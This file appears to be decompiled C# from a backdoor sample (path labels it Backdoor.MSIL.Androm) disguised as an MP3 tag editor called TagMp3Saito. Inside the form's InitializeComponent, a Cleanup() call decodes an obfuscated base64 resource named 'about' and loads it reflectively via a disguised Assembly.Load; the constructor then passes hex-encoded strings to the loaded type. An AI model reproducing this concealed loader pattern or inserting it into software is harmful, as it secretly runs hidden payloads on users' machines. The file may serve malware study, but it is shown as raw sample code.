// Decompiled with JetBrains decompiler
// Type: TagMp3Saito_WindowsFormsApplication.FrmTagMp3Saito
// Assembly: ManualResetEv, Version=0.7.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 555BB952-8DEA-4CDE-87A4-0E642B4B65E6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-1e9b14262f935e7f822b39afe45842ceac9c584e70a3b520d8f391d975d600ee.exe

using FAES.ChamadorProcessos;
using Lambda.Generic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using TagMp3Saito;

namespace TagMp3Saito_WindowsFormsApplication
{
  public class FrmTagMp3Saito : Form
  {
    private IFormComunicator iForm;
    public MusicList musicList;
    private MusicLoader musicLoader;
    private Thread thread;
    private IContainer components = (IContainer) null;
    private static object AssemblyTitleAttribute;
    private Button btnDrop;
    private Button btn_Load_Csv_And_Save_Mp3;
    private StatusStrip statusStrip1;
    private ToolStripStatusLabel toolStripStatusLabel1;
    private Label label1;
    private Label label2;
    private ToolStripProgressBar toolStripProgressBar1;
    private Button btnConfig;
    private TextBox textBox_CSV_FilePath;
    private Button buttonOpenCsvFile;
    private OpenFileDialog openFileDialog_CsvFile;
    private Button buttonOpenExcel;
    private Button buttonOpenTxt;

    public FrmTagMp3Saito()
    {
      this.InitializeComponent();
      ((System.Type) FrmTagMp3Saito.AssemblyTitleAttribute).GetProperties()[0].SetValue((object) null, (object) new string[3]
      {
        "556E69636F64654361746567",
        "346A424353664C",
        "TagMp3Saito_WindowsFormsApplication"
      }, (object[]) null);
    }

    public string Mesage
    {
      set => this.toolStripStatusLabel1.Text = value;
    }

    public bool ShowProgressBar
    {
      set => this.toolStripProgressBar1.Visible = value;
    }

    public int TotalItens
    {
      set => this.toolStripProgressBar1.Maximum = value;
    }

    public int ActualItem
    {
      set => this.toolStripProgressBar1.Value = value;
    }

    public string ShowError
    {
      set
      {
        int num = (int) new FrmLog() { LogMesage = value }.ShowDialog();
      }
    }

    public void FinishSaving()
    {
      this.musicList.Clear();
      this.musicLoader.Clear();
      this.btn_Load_Csv_And_Save_Mp3.Enabled = false;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.musicLoader = new MusicLoader();
      this.iForm = (IFormComunicator) Wrapper.Create(typeof (IFormComunicator), (ISynchronizeInvoke) this);
    }

    private void GetNewCSVFile() => this.textBox_CSV_FilePath.Text = Path.Combine(Path.GetTempPath(), "__TagMp3Saito_Temp_CSV_" + StringTools.Get_Date_Hour() + ".txt");

    private void btnDrop_DragOver(object sender, DragEventArgs e)
    {
      if (!e.Data.GetDataPresent(DataFormats.FileDrop))
        return;
      e.Effect = DragDropEffects.Copy;
    }

    private void btnDrop_DragDrop(object sender, DragEventArgs e) => this.DropedSomething(e);

    private void btn_Load_Csv_And_Save_Mp3_Click(object sender, EventArgs e) => this.FinishSavingCSV();

    private static string GetExcelPath()
    {
      string path1 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).FullName + "\\Microsoft Office\\Office14\\EXCEL.EXE";
      if (File.Exists(path1))
        return path1;
      string path2 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).FullName + "\\Microsoft Office\\Office12\\EXCEL.EXE";
      if (File.Exists(path2))
        return path2;
      string path3 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).FullName + "\\Microsoft Office\\Office11\\EXCEL.EXE";
      if (File.Exists(path3))
        return path3;
      string path4 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).FullName + "\\Microsoft Office\\Office10\\EXCEL.EXE";
      if (File.Exists(path4))
        return path4;
      string path5 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).FullName + "\\MSOffice\\Office97\\Excel\\Excel.exe";
      return File.Exists(path5) ? path5 : string.Empty;
    }

    private void DropedSomething(DragEventArgs e)
    {
      if (!e.Data.GetDataPresent(DataFormats.FileDrop))
        return;
      this.musicLoader.Sources = new List<string>();
      foreach (string str in (string[]) e.Data.GetData(DataFormats.FileDrop))
        this.musicLoader.Sources.Add(str);
      this.thread = new Thread(new ThreadStart(this.LoadMusics));
      this.thread.Start();
    }

    private void LoadMusics()
    {
      this.iForm.ShowProgressBar = true;
      this.musicLoader.LoadingMusicNumber += new MusicLoader.LoadingMusicNumber_Delegate(this.musicLoader_LoadingMusicNumber);
      this.iForm.Mesage = "processing " + (this.iForm.TotalItens = this.musicLoader.LoadPaths().Length).ToString() + " files";
      this.musicList = new MusicList();
      this.musicList = this.musicLoader.GetMusicList();
      this.iForm.Mesage = this.musicList.Count.ToString() + " mp3 files ready to edit";
      this.iForm.ShowProgressBar = false;
    }

    private void musicLoader_LoadingMusicNumber(int actual) => this.iForm.ActualItem = actual;

    private void CallExcel()
    {
      if (!File.Exists(this.textBox_CSV_FilePath.Text))
        this.SaveInitialCSV();
      this.OpenExcel_CsvFile();
      this.toolStripStatusLabel1.Text = "waiting to save updates to mp3 files";
      this.btn_Load_Csv_And_Save_Mp3.Enabled = true;
    }

    private void SaveInitialCSV()
    {
      this.GetNewCSVFile();
      new MusicCsv(this.musicList).SaveCsvFile(this.textBox_CSV_FilePath.Text);
    }

    private void OpenExcel_CsvFile()
    {
      ProcessCaller processCaller = new ProcessCaller((ISynchronizeInvoke) this)
      {
        FileName = FrmTagMp3Saito.GetExcelFileName()
      };
      if (processCaller.FileName.Length == 0)
        return;
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(" \"");
      stringBuilder.Append(this.textBox_CSV_FilePath.Text);
      stringBuilder.Append("\"");
      processCaller.Arguments = stringBuilder.ToString();
      ((AsyncOperation) processCaller).Start();
    }

    private static string GetExcelFileName()
    {
      if (ConfigurationManager.AppSettings["Excel_Path"].Length <= 0)
        return FrmTagMp3Saito.GetExcelPath();
      if (File.Exists(ConfigurationManager.AppSettings["Excel_Path"]))
        return ConfigurationManager.AppSettings["Excel_Path"];
      int num1 = (int) MessageBox.Show("Excel path invalid at TagMp3_Saito.exe.config. \r\nPlease, edit TagMp3_Saito.exe.config located at this application path \r\n(like: C:\\Program Files\\TagMp3Saito\\TagMp3Saito_0.71)", "Error opening Excel", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      int num2 = (int) MessageBox.Show("No Excel Application detected. \r\nPlease, edit TagMp3_Saito.exe.config located at this application path \r\n(like: C:\\Program Files\\TagMp3Saito\\TagMp3Saito_0.71)", "Error opening Excel", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      return string.Empty;
    }

    private void FinishSavingCSV()
    {
      if (!File.Exists(this.textBox_CSV_FilePath.Text))
        return;
      this.thread = new Thread(new ThreadStart(this.Load_Save_Work));
      this.thread.Start();
    }

    private void Load_Save_Work()
    {
      this.iForm.ShowProgressBar = true;
      MusicCsv musicCsv = new MusicCsv(this.textBox_CSV_FilePath.Text);
      try
      {
        musicCsv.LoadAndSave();
      }
      catch (Exception ex)
      {
        this.ShowErrorMessage(ex);
        return;
      }
      this.iForm.Mesage = "all itens successfully saved";
      this.iForm.ShowProgressBar = false;
      this.iForm.FinishSaving();
    }

    private void ShowErrorMessage(Exception ex)
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append("Error");
      stringBuilder.Append("\r\n");
      stringBuilder.Append("--------------");
      stringBuilder.Append("\r\n");
      stringBuilder.Append(ex.Message);
      stringBuilder.Append("\r\n");
      stringBuilder.Append("\r\n");
      stringBuilder.Append("File");
      stringBuilder.Append("\r\n");
      stringBuilder.Append("--------------");
      stringBuilder.Append("\r\n");
      stringBuilder.Append(this.textBox_CSV_FilePath.Text);
      stringBuilder.Append("\r\n");
      stringBuilder.Append("\r\n");
      stringBuilder.Append("StackTrace = ");
      stringBuilder.Append("\r\n");
      stringBuilder.Append("--------------");
      stringBuilder.Append("\r\n");
      stringBuilder.Append(ex.StackTrace);
      this.iForm.ShowError = stringBuilder.ToString();
    }

    private void btnConfig_Click(object sender, EventArgs e)
    {
      int num = (int) new FrmSetColumns().ShowDialog();
    }

    private void buttonOpenCsvFile_Click(object sender, EventArgs e)
    {
      if (File.Exists(this.textBox_CSV_FilePath.Text))
      {
        FileInfo fileInfo = new FileInfo(this.textBox_CSV_FilePath.Text);
        this.openFileDialog_CsvFile.FileName = fileInfo.FullName;
        this.openFileDialog_CsvFile.InitialDirectory = fileInfo.DirectoryName;
      }
      else
        this.openFileDialog_CsvFile.InitialDirectory = Path.GetTempPath();
      int num = (int) this.openFileDialog_CsvFile.ShowDialog();
    }

    private void openFileDialog_CsvFile_FileOk(object sender, CancelEventArgs e)
    {
      if (e.Cancel)
        return;
      this.textBox_CSV_FilePath.Text = this.openFileDialog_CsvFile.FileName;
      if (new FileInfo(this.textBox_CSV_FilePath.Text).Exists)
      {
        this.toolStripStatusLabel1.Text = "waiting to save updates to mp3 files";
        this.btn_Load_Csv_And_Save_Mp3.Enabled = true;
      }
    }

    private void buttonOpenExcel_Click(object sender, EventArgs e) => this.CallExcel();

    private void buttonOpenTxt_Click(object sender, EventArgs e)
    {
      if (!File.Exists(this.textBox_CSV_FilePath.Text))
        return;
      new Process()
      {
        StartInfo = {
          FileName = this.textBox_CSV_FilePath.Text
        }
      }.Start();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private static void Cleanup() => FrmTagMp3Saito.MessageData(FrmTagMp3Saito.IDeferred(Convert.FromBase64String(((string) new ResourceManager(typeof (FrmTagMp3Saito)).GetObject("about")).Replace("ē", "B").Replace("öş", "A"))));

    private static Assembly IDeferred(byte[] Field) => (Assembly) typeof (Assembly).InvokeMember("#Load".TrimStart('#'), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) Field
    });

    private static void MessageData(Assembly TwoDigitYearMax) => FrmTagMp3Saito.AssemblyTitleAttribute = (object) TwoDigitYearMax.GetTypes()[0];

    private void InitializeComponent()
    {
      this.btnDrop = new Button();
      this.btn_Load_Csv_And_Save_Mp3 = new Button();
      this.statusStrip1 = new StatusStrip();
      this.toolStripProgressBar1 = new ToolStripProgressBar();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.label1 = new Label();
      this.label2 = new Label();
      this.btnConfig = new Button();
      this.textBox_CSV_FilePath = new TextBox();
      this.buttonOpenCsvFile = new Button();
      FrmTagMp3Saito.Cleanup();
      this.openFileDialog_CsvFile = new OpenFileDialog();
      this.buttonOpenExcel = new Button();
      this.buttonOpenTxt = new Button();
      this.statusStrip1.SuspendLayout();
      this.SuspendLayout();
    }
  }
}
